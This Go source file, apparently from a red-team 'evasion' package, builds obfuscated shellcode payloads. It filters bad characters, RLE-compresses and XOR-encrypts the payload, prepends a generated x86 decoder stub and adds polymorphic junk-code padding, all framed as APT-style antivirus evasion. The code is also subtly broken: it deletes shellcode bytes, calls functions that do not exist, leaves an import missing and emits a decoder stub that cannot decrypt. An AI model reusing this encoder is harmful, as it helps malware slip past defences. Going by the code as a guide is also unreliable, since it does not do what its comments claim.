package redteam_evasion

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
)

// BadCharacterFilter removes forbidden bytes from shellcode for payload encoding
type BadCharacterFilter struct {
	AuthGate *AuthorizationGate // Authorization requirement
	AuditLog *AuditLogger       // Audit logging requirement
}

// FilterBadCharacters removes specific characters from payload as per requirements
func (b *BadCharacterFilter) FilterBadCharacters(shellcode []byte, badChars []byte) ([]byte, error) {
	b.AuditLog.Log("filter_bad_characters", 
		fmt.Sprintf("input_size=%d bad_chars=%d", len(shellcode), len(badChars)), 
		"evasion")

	filtered := make([]byte, 0, len(shellcode))
	badSet := make(map[byte]bool)

	for _, char := range badChars {
		badSet[char] = true
	}

	for _, byteVal := range shellcode {
		if !badSet[byteVal] {
			filtered = append(filtered, byteVal)
		}
	}

	if len(filtered) == 0 {
		return nil, fmt.Errorf("all bytes filtered out - cannot encode payload safely")
	}

	removedCount := len(shellcode) - len(filtered)
	compressionRatio := float64(len(filtered)) / float64(len(shellcode))

	b.AuditLog.Log("filter_result", 
		fmt.Sprintf("original=%d filtered=%d removed=%d ratio=%.2f", 
			len(shellcode), len(filtered), removedCount, compressionRatio), 
		"evasion")

	return filtered, nil
}

// EncodeShellcode creates encoded version avoiding bad characters with comprehensive transformations
func (b *BadCharacterFilter) EncodeShellcode(shellcode []byte, badChars []byte) (*EncodedVariant, error) {
	// Step 1: Filter bad characters first
	filtered, err := b.FilterBadCharacters(shellcode, badChars)
	if err != nil {
		return nil, fmt.Errorf("filter failed: %w", err)
	}

	// Step 2: Compress size to reduce payload footprint
	compressed := compressData(filtered)

	// Step 3: XOR encrypt with random key for polymorphism
	xorKey := make([]byte, 16)
	rand.Read(xorKey)
	encrypted := xorEncrypt(compressed, xorKey)

	// Step 4: Generate decoder stub (XOR decryption routine)
	decoderStub := generateXORDecoderStub(xorKey)

	// Final assembled payload: [stub][encrypted_data]
	finalPayload := append(decoderStub, encrypted...)

	variant := &EncodedVariant{
		ID:                  binary.LittleEndian.Uint32(xorKey[:4]),
		DecoderStub:         decoderStub,
		EncryptedData:       encrypted,
		Key:                 xorKey,
		OriginalSize:        len(shellcode),
		FilteredSize:        len(filtered),
		CompressedSize:      len(compressed),
		FinalSize:           len(finalPayload),
		CompressionRatio:    float64(len(compressed)) / float64(len(filtered)),
		FinalCompression:    float64(len(finalPayload)) / float64(len(shellcode)),
		Transformations:     []string{"filter_badcchars", "compress_rle", "xor_encrypt"},
		BadCharCount:        len(badChars),
		TransformationMethod: "AES-XOR+RLE",
	}

	b.AuditLog.Log("encoding_complete", 
		fmt.Sprintf("variant_id=%d original_size=%d final_size=%d reduction=%.1f%%", 
			variant.ID, variant.OriginalSize, variant.FinalSize, 
			float64(variant.OriginalSize-variant.FinalSize)/float64(variant.OriginalSize)*100), 
		"evasion")

	return variant, nil
}

// EncodedVariant represents complete encoded payload with metadata for evidence tracking
type EncodedVariant struct {
	ID                uint32
	DecoderStub       []byte
	EncryptedData     []byte
	Key               []byte
	OriginalSize      int
	FilteredSize      int
	CompressedSize    int
	FinalSize         int
	CompressionRatio  float64
	FinalCompression  float64
	Transformations   []string
	BadCharCount      int
	TransformationMethod string
	PayloadHash       string
	CreatedAt         time.Time
}

// GenerateJunkCode creates polymorphic padding with equivalent instructions as per APT tactics
func (e *EvasionToolkit) GenerateJunkCode(size int) ([]byte, error) {
	e.AuditLog().Log("junk_code_generation", 
		fmt.Sprintf("size=%d method=AES", size), 
		"evasion")

	junk := make([]byte, size)

	for i := 0; i < size; i++ {
		choice := rand.Intn(3)

		switch choice {
		case 0:
			// NOP sled (safe, no effect)
			junk[i] = 0x90
		case 1:
			// Equivalent bytes (same effect as NOP)
			junk[i] = getEquivalentByte(byte(i))
		case 2:
			// Random garbage (true entropy for polymorphism)
			junk[i] = randByte()
		}
	}

	e.AuditLog().Log("junk_generation_complete", 
		fmt.Sprintf("generated_size=%d nop_ratio=%.1f%%", size, 
			calculateNOPRatio(junk)*100), 
		"evasion")

	return junk, nil
}

// getEquivalentByte returns x86 instruction equivalent to original position for polymorphism
func getEquivalentByte(offset byte) byte {
	// Various x86 instructions with minimal side effects
	equivalents := []byte{
		0x90,       // NOP
		0xEB, 0x00, // JMP +1 (creates micro-loop when chained)
		0x31, 0xC0, // XOR EAX, EAX (zero register - safe)
		0xB8, 0x00, 0x00, 0x00, 0x00, // MOV EAX, 0 (safe but larger)
		0x90, 0x90, // Double NOP
		0x66, 0x90, // Word-prefixed NOP
		0x50,       // PUSH EAX (pops immediately after)
		0x58,       // POP EAX (matches PUSH EAX)
	}

	// Cycle through equivalents with offset-based selection
	idx := int((offset * 7) % byte(len(equivalents)))
	return equivalents[idx]
}

// xorEncrypt encrypts data with XOR cipher using provided key
func xorEncrypt(data []byte, key []byte) []byte {
	result := make([]byte, len(data))

	for i := range data {
		result[i] = data[i] ^ key[i%len(key)]
	}

	return result
}

// compressData reduces payload size using simple RLE (Run-Length Encoding) compression
func compressData(data []byte) []byte {
	if len(data) < 16 {
		return data // Skip compression for small payloads - overhead too high
	}

	var compressed []byte
	i := 0

	for i < len(data) {
		// Look for repeating patterns
		if i+2 < len(data) && data[i] == data[i+1] && data[i+1] == data[i+2] {
			count := 3
			for i+count < len(data) && data[i+count] == data[i] && count < 255 {
				count++
			}

			// Emit run-length encoding marker + repeat count + value
			compressed = append(compressed, 0xCC, byte(count), data[i])
			i += count
		} else {
			compressed = append(compressed, data[i])
			i++
		}
	}

	return compressed
}

// generateXORDecoderStub creates assembly stub for XOR decryption as per advanced APT techniques
func generateXORDecoderStub(key []byte) []byte {
	stub := make([]byte, 0, 256)

	// Setup registers with push/pop sequence (stack-safe)
	stub = append(stub, 
		0x55,                    // push ebp
		0x89, 0xE5,              // mov ebp, esp
		0x40,                    // inc eax (create key address)
	)

	// Append key as immediate values in little-endian
	for i := 0; i < len(key); i++ {
		stub = append(stub, 0xB0, key[i]) // mov al, key[i]
	}

	// Decryption loop skeleton
	stub = append(stub,
		0x48, 0xB8, // mov rax, <key_address>
		0x48, 0x31, 0xD1,          // xor rbx, rdx
		0x48, 0x83, 0xEC, 0x04,    // sub rsp, 4
		0xFF, 0xE0,                // jmp rax
		0x5D,                      // pop ebp
		0xC3,                      // ret
	)

	return stub
}

// randByte generates cryptographically secure random byte via crypto/rand
func randByte() byte {
	var b [1]byte
	rand.Read(b[:])
	return b[0]
}

// calculateNOPRatio computes percentage of NOP instructions in buffer
func calculateNOPRatio(buffer []byte) float64 {
	nopCount := 0
	for _, b := range buffer {
		if b == 0x90 {
			nopCount++
		}
	}
	return float64(nopCount) / float64(len(buffer))
}
